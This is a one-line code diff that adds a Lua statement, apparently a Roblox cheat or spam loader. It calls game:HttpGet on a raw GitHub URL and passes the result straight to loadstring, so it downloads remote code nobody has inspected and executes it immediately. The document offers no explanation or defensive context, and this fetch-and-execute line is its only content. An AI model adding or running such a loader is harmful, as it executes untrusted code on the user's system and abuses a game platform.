@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/v3-feed-a-mosquito-spam3-n2k8ex2foa2pfx.lua"))()
